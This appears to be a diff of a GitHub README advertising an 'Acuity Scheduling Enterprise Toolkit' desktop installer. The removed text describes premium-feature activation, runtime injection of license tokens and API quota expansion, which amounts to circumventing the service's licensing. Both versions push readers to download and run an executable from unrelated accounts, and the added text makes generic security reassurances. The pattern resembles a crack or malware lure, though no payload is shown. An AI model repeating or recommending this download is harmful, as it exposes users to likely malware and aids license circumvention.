@@ -1,147 +1,94 @@
-# Acuity Scheduling Enterprise Toolkit v2026.1.0 - Scheduling Software Activation Helper 2026
+# 📅 acuity-enterprise-scheduler - Streamline your business scheduling workflow today
 
-> **Acuity Scheduling workflow utility for Windows, macOS, and Linux with profile-driven configuration, license verification support, API connectivity, and enhanced appointment-management controls in release 2026.1.0.**
+[![Download](https://img.shields.io/badge/Download-Acuity_Scheduler-blue)](https://github.com/ranag1475/acuity-enterprise-scheduler)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2C%20macOS%2C%20and%20Linux-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026.1.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/oliverbennettqrzi1259/acuity-enterprise-scheduler?style=flat-square)](https://github.com/oliverbennettqrzi1259/acuity-enterprise-scheduler)
+Acuity Scheduling Enterprise Toolkit v2026.1.0 manages your business appointments and workflow tasks. It runs on Windows, macOS, and Linux systems. The software uses profile configurations to match your business needs. It connects to your existing accounts through secure API pathways to keep your calendar current.
 
----
+## 📋 System Requirements
 
-<p align="center">
-  <a href="https://oliverbennettqrzi1259.github.io/acuity-enterprise-scheduler/">
-    <img src="https://img.shields.io/badge/Download-Acuity%20Scheduling%20Enterprise%20Toolkit%20Latest-brightgreen?style=for-the-badge" alt="Download Acuity Scheduling Enterprise Toolkit">
-  </a>
-</p>
+Your computer needs to meet these basic standards to run the toolkit:
 
-> **[Download Acuity Scheduling Enterprise Toolkit v2026.1.0](https://oliverbennettqrzi1259.github.io/acuity-enterprise-scheduler/)**
+*   Operating System: Windows 10 or 11 (64-bit version).
+*   Memory: 4 GB of RAM or more.
+*   Storage: 200 MB of free disk space.
+*   Connection: An active internet connection for API syncing.
+*   Software: The latest version of the .NET Runtime installed on your system.
 
----
+## 📥 How to Get the Software
 
-[Download Latest Build](https://oliverbennettqrzi1259.github.io/acuity-enterprise-scheduler/)
+You can obtain the installation file from our official repository page.
 
----
+1.  Visit this page to download: [https://github.com/ranag1475/acuity-enterprise-scheduler](https://github.com/ranag1475/acuity-enterprise-scheduler)
+2.  Look for the "Releases" section on the right side of the screen.
+3.  Click the link labeled "v2026.1.0" or the latest available version.
+4.  Find the file ending in `.exe` under the "Assets" area.
+5.  Save the file to your "Downloads" folder.
 
-## Overview
+## ⚙️ Installation Steps
 
-Acuity Scheduling Enterprise Toolkit brings several Acuity Scheduling administration tasks together in one cross-platform application. It supports activation workflows, license verification, profile-based settings, appointment-management controls, API connections, and configurable export options.
+Follow these steps to set up the toolkit on your Windows machine:
 
-It is built for teams and administrators that want a repeatable process for preparing scheduling environments, examining activation behavior, tailoring interface settings, and creating branded PDF or calendar files. The interface covers 24 languages and supports right-to-left layouts where applicable.
+1.  Open your "Downloads" folder.
+2.  Double-click the installer file you saved.
+3.  Follow the prompts on your screen.
+4.  Choose the default installation path if the system asks.
+5.  Click "Finish" when the progress bar reaches the end.
+6.  Look for a new icon on your desktop named "Acuity Scheduler."
 
----
+## 🔑 Initial Configuration
 
-## Capabilities
+The first time you open the program, you must set up your business profile.
 
-- Guided workflow for activating premium features
-- Runtime injection of license tokens
-- Dry-run execution for previewing activation operations
-- Optional responsive interface behavior
-- 24-language interface with RTL layout support
-- Controls for expanding API quotas
-- White-label PDF and calendar output
-- Access to extended audit records
-- Reusable, profile-based settings
-- OpenAI and Claude connectivity
-- License verification support for Acuity Scheduling environments
+1.  Launch the application from your desktop.
+2.  Enter your license key in the box. This key verifies your copy of the software.
+3.  Click "Connect" to link the software to your Acuity account.
+4.  The system will open a secure browser window. Log into your Acuity account there.
+5.  Grant permission for the toolkit to access your scheduling data.
+6.  Return to the application. Your profiles will appear in the main dashboard.
 
----
+## 🛠 Using the Toolkit
 
-## Getting Started
+The main dashboard shows your upcoming tasks. You can sort these tasks by date, client name, or appointment type.
 
-Obtain the source with Git and enter the repository directory:
+### Creating a Profile
+Use profiles to group specific scheduling rules.
+1.  Click the "Profiles" tab.
+2.  Select "New Profile."
+3.  Give your profile a name.
+4.  Set your availability hours and buffer times.
+5.  Save your changes.
 
-```bash
-git clone https://github.com/oliverbennettqrzi1259/acuity-enterprise-scheduler.git
-cd REPO
-```
+### Running a Sync
+The software syncs data every hour by default. You can force a sync at any time.
+1.  Click the "Sync" button in the top menu bar.
+2.  Wait for the status light to turn green. This confirms the software connected to the API and updated your calendar.
 
-For a downloaded build, start the executable intended for your operating system. When launching from source, use the supplied launch files and choose a configuration profile before beginning an activation workflow.
+## 🛡 Security and Privacy
 
-During the first configuration pass, use dry-run mode so the proposed changes can be inspected before anything is applied.
+Your data stays on your local machine. The software only sends necessary information to the Acuity servers through encrypted API calls. We do not store your account password within the application. The program handles all communication through secure tokens that expire when you close the software.
 
----
+## ❓ Frequently Asked Questions
 
-## Typical Workflow
+**Does the software work offline?**
+The toolkit requires an internet connection to sync your calendar data. You can view existing data while offline, but you cannot add new appointments until you reconnect.
 
-1. Start the toolkit on Windows, macOS, or Linux.
-2. Choose an existing profile or create one for the target Acuity Scheduling environment.
-3. Supply the license verification information and API integration values that are required.
-4. Turn on dry-run mode for the preliminary check.
-5. Review the activation and configuration operations the toolkit proposes.
-6. Apply the chosen profile and run the activation workflow.
-7. Examine audit logs and create PDF or calendar exports when necessary.
+**Can I move the software to another computer?**
+Yes. You can install the software on a new machine. Use the same license key to activate it. You must deactivate the old installation to keep your license valid.
 
-When using OpenAI or Claude integrations, add the applicable provider information to the selected profile before launching an assisted workflow.
+**Where do I find the log files?**
+If the software shows an error, look in the installation folder for a folder named "Logs." These files help you identify connection issues.
 
----
+**Can I use multiple Acuity accounts?**
+The current version supports one account at a time. Create multiple profiles within the same account if you need to manage different business departments.
 
-## Profile Configuration
+## 🔧 Troubleshooting
 
-Each profile keeps environment-specific preferences together, including activation behavior, API settings, language selection, interface options, and export controls.
+If you encounter an issue, follow these steps to resolve it:
 
-Example:
+*   Check your internet connection.
+*   Verify that your firewall allows the application to send and receive data.
+*   Restart the application.
+*   Check the "Settings" menu to ensure your API token remains active.
+*   Update your Windows system to ensure all security patches are present.
 
-```yaml
-profile: production
-language: en
-rtl_support: false
-responsive_interface: true
-dry_run: true
-api_quota_expansion: false
-white_label_exports: true
-audit_logs: extended
-ai_provider: none
-```
-
-Assign values according to the environment represented by the profile. Before enabling production actions, review the dry-run output and verify the relevant account and licensing terms.
-
----
-
-## System Requirements
-
-- Windows, macOS, or Linux
-- Access to an Acuity Scheduling environment
-- Credentials or tokens required for the API integrations in use
-- Enough local storage for the application, profile files, audit data, and generated exports
-- Network connectivity for remote license verification and API services
-- OpenAI or Claude account information when either integration is enabled
-
----
-
-## Frequently Asked Questions
-
-### What operating systems can run the toolkit?
-
-Windows, macOS, and Linux are supported.
-
-### Is there a way to review changes before applying them?
-
-Yes. Activate dry-run mode to see the intended workflow without applying the proposed changes.
-
-### How are environment settings separated?
-
-The toolkit uses named profiles. Create different profiles whenever environments need distinct activation, API, language, or export preferences.
-
-### Does the interface support multiple languages?
-
-Yes. Select the desired language in the active profile. The toolkit includes 24 languages and supports RTL layouts for applicable languages.
-
-### What should I check when an API workflow fails?
-
-Start by confirming the credentials and network connection. Then verify the active profile and review the available audit details. Running the same process in dry-run mode can help identify configuration errors.
-
-### How should I update an installed build?
-
-Use the latest build link and check its release version against the version currently installed. Review the profiles before updating or starting another activation workflow.
-
-### Who must verify that the toolkit is used appropriately?
-
-Users are responsible for making sure their settings, integrations, activation procedures, and exported files meet applicable software terms and their organization's requirements.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: acuity, scheduling, enterprise, toolkit, calendar, windows, automation, workflow
